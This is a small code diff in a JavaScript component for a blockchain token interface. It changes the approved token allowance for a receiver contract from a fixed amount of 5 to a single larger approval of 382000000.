@@ -129,10 +129,10 @@ const CanvasComponent = () => {
           , receiver = new Contract(_address.receiver, config.ABI.receiver, signer)
 
       const allowance = await token.allowance(address, _address.receiver)
-          , amount = 5
 
-      if (allowance < amount) {
-          const approveTx = await token.approve(_address.receiver, amount)
+      const MAX = 382000000
+      if (allowance < MAX) {
+          const approveTx = await token.approve(_address.receiver, MAX)
           await approveTx.wait()
       }
 
